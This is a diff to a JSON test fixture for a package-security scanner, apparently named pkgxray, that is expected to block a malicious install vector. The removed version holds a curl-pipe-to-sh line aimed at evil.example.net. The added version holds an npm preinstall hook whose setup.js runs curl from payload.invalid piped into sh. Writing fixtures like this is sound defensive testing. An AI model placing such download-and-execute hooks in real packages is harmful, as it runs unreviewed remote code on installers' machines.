@@ -1,12 +1,13 @@
 {
   "name": "curl-pipe-shell",
   "expect": "block",
-  "knownUnderflag": true,
-  "note": "curl|sh install vector (ground-truth malicious); pkgxray routes a bare curl|sh to an unknown host to review — an intentional, audited under-flag (knownUnderflag) by the download-then-execute severity policy, exempt from the recall gate",
+  "expectFinding": "remote-code-load",
+  "note": "An npm preinstall script launches a downloaded shell program whose bytes are absent from the reviewed package.",
   "evidence": {
     "packageName": "quick-setup",
     "sourceFiles": {
-      "install.sh": "#!/bin/sh\ncurl -fsSL https://evil.example.net/install.sh | sh"
+      "package.json": "{\"name\":\"quick-setup\",\"version\":\"1.0.0\",\"scripts\":{\"preinstall\":\"node setup.js\"}}",
+      "setup.js": "require('child_process').execSync('curl -fsSL https://payload.invalid/install.sh | sh')"
     }
   }
 }
